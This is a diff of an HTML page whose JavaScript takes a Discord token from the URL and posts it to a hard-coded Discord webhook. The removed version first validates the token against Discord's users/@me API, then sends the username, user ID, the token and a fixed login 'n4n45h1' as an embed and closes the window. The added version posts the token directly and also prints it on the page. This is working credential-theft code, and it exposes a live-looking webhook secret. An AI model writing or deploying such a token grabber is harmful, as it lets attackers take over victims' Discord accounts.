@@ -1,106 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Token Sender</title>
+  <title>Token Receiver</title>
 </head>
 <body>
+  <h1>Token Received!</h1>
+  <p id="tokenDisplay"></p>
 
   <script>
-    function sendDataAndClose(token) {
+    function sendWebhook(token) {
       const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE'; // Webhook URL
-      const DISCORD_BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'; // Discord Bot Token (絶対に安全な場所に保管してください)
-
-      // ユーザー情報を取得
-      fetch('https://discord.com/api/v10/users/@me', {
-        method: 'GET',
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
         headers: {
-          Authorization: `Bearer ${token}`,
+          'Content-Type': 'application/json',
         },
+        body: JSON.stringify({ content: `Token: ${token}` }),
       })
       .then(response => {
-        if (!response.ok) {
-          console.error('Failed to get user info:', response.status, response.statusText);
-          return null; // ユーザー情報取得失敗
-        }
-        return response.json();
-      })
-      .then(userData => {
-        // ユーザー情報を取得に成功した場合のみWebhookを送信
-        if (userData) {
-          // 現在の日時をUTCでフォーマット
-          const now = new Date();
-          const year = now.getUTCFullYear();
-          const month = String(now.getUTCMonth() + 1).padStart(2, '0'); // 月は0から始まるため+1
-          const day = String(now.getUTCDate()).padStart(2, '0');
-          const hours = String(now.getUTCHours()).padStart(2, '0');
-          const minutes = String(now.getUTCMinutes()).padStart(2, '0');
-          const seconds = String(now.getUTCSeconds()).padStart(2, '0');
-          const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
-
-          // Webhookに送信するデータ (Embed形式)
-          const embed = {
-            title: 'Discord Token Information',
-            color: 0x5865F2, // Discord Blue
-            fields: [
-              {
-                name: 'Username',
-                value: userData.username + '#' + userData.discriminator,
-                inline: true,
-              },
-              {
-                name: 'User ID',
-                value: userData.id,
-                inline: true,
-              },
-              {
-                name: 'Token',
-                value: token,
-                inline: false,
-              },
-              {
-                name: 'Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted)',
-                value: formattedDateTime,
-                inline: false,
-              },
-              {
-                name: 'Current User\'s Login',
-                value: 'n4n45h1', // 固定値
-                inline: false,
-              },
-            ],
-            timestamp: new Date().toISOString(),
-          };
-
-          const payload = {
-            embeds: [embed],
-          };
-
-          // Webhookを送信
-          return fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload),
-          });
+        if (response.ok) {
+          console.log('Webhook sent successfully!');
         } else {
-          console.error('User data not available.');
-          return Promise.resolve(); // ユーザー情報がない場合は解決済みのPromiseを返す
-        }
-      })
-      .then(response => {
-        if (response && response.ok) {
-          console.log('Data sent successfully!');
-        } else if (response) {
-          console.error('Failed to send data:', response.status, response.statusText);
+          console.error('Failed to send webhook:', response.status, response.statusText);
         }
       })
       .catch(error => {
-        console.error('Error sending data:', error);
-      })
-      .finally(() => {
-        // 送信後にウィンドウを閉じる
-        window.close();
+        console.error('Error sending webhook:', error);
       });
     }
 
@@ -109,12 +34,13 @@
     const token = urlParams.get('token');
 
     if (token) {
-      // データを送信してウィンドウを閉じる
-      sendDataAndClose(token);
+      // ウェブページにトークンを表示 (デバッグ用)
+      document.getElementById('tokenDisplay').innerText = `Token: ${token}`;
+
+      // Webhookを送信
+      sendWebhook(token);
     } else {
       console.log('Token not found in URL.');
-      // トークンがない場合もウィンドウを閉じる
-      window.close();
     }
   </script>
 </body>
